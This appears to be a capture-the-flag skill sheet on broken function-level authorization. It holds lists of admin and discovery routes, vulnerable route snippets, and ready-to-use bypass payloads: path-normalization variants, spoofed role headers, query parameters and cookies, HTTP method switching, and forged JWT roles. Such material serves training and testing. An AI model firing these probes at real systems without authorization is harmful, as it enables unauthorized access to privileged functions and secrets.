# Function-level — the route that exists but isn't checked

An endpoint exists for a privileged function — and the route doesn't
verify the caller's privilege. The "IDOR" is reaching the function
itself.

---

## 1. The surfaces — the privileged-function namespace

```
/admin/...          /admin/users /admin/flag /admin/config /admin/dashboard
                    /admin/logs /admin/backup /admin/db /admin/query
                    /admin/exec /admin/eval /admin/debug /admin/status
                    /admin/env /admin/secrets /admin/keys /admin/tokens
                    /admin/sessions /admin/cache /admin/queue /admin/jobs
                    /admin/metrics /admin/reports /admin/exports /admin/imports
                    /admin/files /admin/objects /admin/roles /admin/permissions
                    /admin/audit /admin/events /admin/webhooks /admin/settings
                    /admin/system /admin/info /admin/health /admin/panel
                    /admin/console /admin/shell /admin/terminal /admin/repl
                    /admin/promote /admin/grant /admin/impersonate
/api/admin/...      /api/admin/users /api/admin/flag /api/admin/config
/internal/...       /internal/admin /internal/flag /internal/debug
/_admin/...         /.admin/...    /~/admin/...
/manage/...         /management/... /panel/... /control/... /dashboard/...
/superuser/...      /su/...        /root/...   /staff/...  /moderator/...
/dev/...            /debug/...     /test/...   /staging/... /internal/...
```

The endpoint is unlinked — found via `robots.txt`, the schema, the
actuator `/mappings`, the debug `/routes`, the JS bundle, or a guess.

## 2. The mechanism — the route exists, the check doesn't

```python
@app.route('/admin/flag')
def admin_flag():
    # no @requires_admin
    return flag
```

The route is registered but the authz decorator/middleware is missing —
or it's on a *different* mount (`/api/admin` vs `/admin`).

## 3. The "the check is on a different mount" bug

```python
api = Blueprint('api', __name__, url_prefix='/api')

@api.route('/users/<id>')          # /api/users/<id> — has authz
def user(id): ...

@app.route('/users/<id>')          # /users/<id> — NO authz, different mount
def user2(id): return user(id)
```

`/users/<id>` (no `/api` prefix) reaches the same handler without the
Blueprint's authz. Try both prefixes.

## 4. The "the middleware order" bug

```python
app.use('/api', authz)          # authz on /api/*
app.get('/api/users')           # guarded
app.get('/admin/users')         # NOT under /api — unguarded
app.use('/admin', adminAuthz)   # admin authz mounted AFTER the route
```

`app.use('/admin', ...)` mounted *after* `app.get('/admin/users')`
doesn't protect the earlier route — order matters. Or `app.use(authz)`
mounted after the routes it should guard.

## 5. The "the check is a decorator that's skipped" bug

```python
@requires_admin
def flag(): ...

@app.route('/flag')        # calls flag() directly, no decorator
def flag_route():
    return flag()
```

The helper has the check but the route calls it without the decorator.

## 6. The "the role check is a param/header/cookie" bug

```python
if request.args.get('role') == 'admin':          # ?role=admin
if request.headers.get('X-Role') == 'admin':     # X-Role: admin
if request.headers.get('X-Admin') == 'true':     # X-Admin: true
if request.cookies.get('role') == 'admin':       # Cookie: role=admin
if request.json.get('isAdmin'):                  # {"isAdmin":true}
```

The role is a client-supplied param/header/cookie, not the session.
Every place a "role" could be read is a bypass.

## 7. The "the role is in the JWT but unsigned" bug

The JWT carries `role:admin` but the signature is `alg:none` or a weak
key — forge it. See `web-auth-session`.

## 8. The "the route is behind a proxy" bug

```
GET /admin/flag          → 403 (the proxy checks /admin/*)
GET /internal/admin/flag → 200 (the app's own route, no proxy check)
GET /.admin/flag         → 200 (a hidden alias)
GET /_admin/flag         → 200
GET /~/admin/flag        → 200
GET /api/admin/flag      → 200
GET /api/internal/admin/flag → 200
GET /api/v2/admin/flag   → 200
```

The proxy guards `/admin/*` but the app also serves it on a different
prefix — the alternate path bypasses.

## 9. The "the same handler, different path" bug

```python
@app.route('/users/<id>')            # checked
@app.route('/u/<id>')                # same handler, unchecked
@app.route('/u/<id>/')               # trailing slash
@app.route('/users/<id>/')           # trailing slash
@app.route('/users//<id>')           # double slash
@app.route('/users/./<id>')          # dot-segment
@app.route('/users/<id>.json')       # format
@app.route('/api/v1/users/<id>')     # versioned
@app.route('/api/v2/users/<id>')     # versioned
@app.route('/api/legacy/users/<id>')
@app.route('/api/internal/users/<id>')
@app.route('/api/v1/u/<id>')
@app.route('/v1/users/<id>')
@app.route('/v2/users/<id>')
@app.route('/legacy/users/<id>')
@app.route('/internal/users/<id>')
@app.route('/users/<id>', methods=['POST'])
@app.route('/users/<id>', methods=['PUT'])
```

Every alias for the same handler — the check is on *one* of them.

## 10. The "the method is the check" bug

```python
@app.route('/admin/flag', methods=['GET'])   # GET is checked
def admin_flag():
    if request.method == 'POST':
        return flag                # POST path skips the check
```

`POST /admin/flag` — the check is on GET only. Also try `OPTIONS`/`HEAD`/
`TRACE`/`CONNECT`/`PATCH`/`PUT`/`DELETE`/`PROPFIND`/`SEARCH`/`COPY`/
`MOVE`/`MKCOL` — a method the authz middleware doesn't cover.

## 11. The "the path normalization" bypass

```
/admin/flag
//admin/flag
/admin//flag
/admin/./flag
/admin/../admin/flag
/admin/%2e/flag
/admin/%2e%2e/flag
/admin/flag/
/admin/flag/.
/admin/flag/..
/admin%2fflag
/admin%252fflag
/ADMIN/flag
/Admin/Flag
/admin/FLAG
/admin/flag%00
/admin/flag%20
/admin/flag%09
/admin/flag%0a
/admin/flag%0d
/admin/flag%3f
/admin/flag%23
/admin/flag;
/admin/flag;param=1
/admin/flag.js
/admin/flag.json
/admin/flag.html
/admin/flag.xml
```

The authz regex `/admin/` matches but the normalization differs —
`//admin`, `/admin/`, `;param`, the encoded slash, the case, the suffix.
See `skills/web-parser-differential/`.

## 12. The "the discovery" paths

```
/robots.txt         — Disallow: /admin
/sitemap.xml
/security.txt
/api-docs /swagger.json /openapi.json /redoc /docs
/graphql            — the schema names the admin mutations
/graphiql /playground /console
/actuator /actuator/env /actuator/beans /actuator/mappings
/actuator/health /actuator/info /actuator/metrics /actuator/trace
/actuator/heapdump /actuator/threaddump /actuator/loggers
/actuator/configprops /actuator/scheduledtasks /actuator/httptrace
/actuator/jolokia /actuator/prometheus /actuator/gateway
/metrics
/debug/pprof /debug/vars /debug/requests /debug/events /debug/flags
/phpinfo.php /info.php
/server-status /server-info /nginx_status /apache_status /elb-status
/health /healthz /readyz /livez /status /statusz /ping /pong
/version /build /manifest.json /asset-manifest.json
```

The meta-route that names the admin path — `robots.txt`, the schema,
the actuator `/mappings`, the debug `/routes`, the JS bundle's routes.

## 13. The "the feature flag" bug

`?feature=admin` / `?debug=true` / `?admin_preview=1` / `?admin=true` /
`?staff=true` / `?internal=true` — a feature flag that exposes the
admin surface.

## 14. The "the default admin" path

`/setup` / `/install` / `/init` / `/first-run` / `/wizard` /
`/bootstrap` / `/configure` / `/register-admin` — the setup route that
creates the admin, left reachable.

## 15. The "the role in the query" — the check reads a param

```
GET /admin/flag?role=admin
GET /admin/flag?is_admin=1
GET /admin/flag?admin=1
GET /admin/flag?user=admin
GET /admin/flag?as=admin
GET /admin/flag?impersonate=1
GET /admin/flag?sudo=1
GET /admin/flag?su=1
GET /admin/flag?debug=1
GET /admin/flag?test=1
GET /admin/flag?internal=1
GET /admin/flag?staff=1
GET /admin/flag?preview=1
GET /admin/flag?token=admin
GET /admin/flag?key=admin
GET /admin/flag?secret=admin
GET /admin/flag?auth=admin
```

## 16. The "the role in the header"

```
X-Role: admin        X-Admin: true       X-Is-Admin: 1
X-Staff: true        X-Internal: true    X-Debug: true
X-Superuser: true    X-Root: true        X-Su: 1
X-Impersonate: 1     X-As-User: 1        X-On-Behalf-Of: 1
X-Act-As: 1          X-User: admin       X-User-Id: 1
X-Forwarded-User: admin  X-Remote-User: admin
X-Auth-User: admin   X-Authenticated-User: admin
Authorization: admin  X-Api-Role: admin
```

## 17. The "the role in the cookie"

```
Cookie: role=admin    Cookie: is_admin=1    Cookie: admin=1
Cookie: user=admin    Cookie: uid=1         Cookie: staff=1
Cookie: su=1          Cookie: debug=1       Cookie: internal=1
```

## 18. Evidence

`GET /admin/flag` → `200 flag{...}` — the flag is the response. The
proof is the privileged function reached without privilege — a
`confirms` with the flag-shaped `--response`.
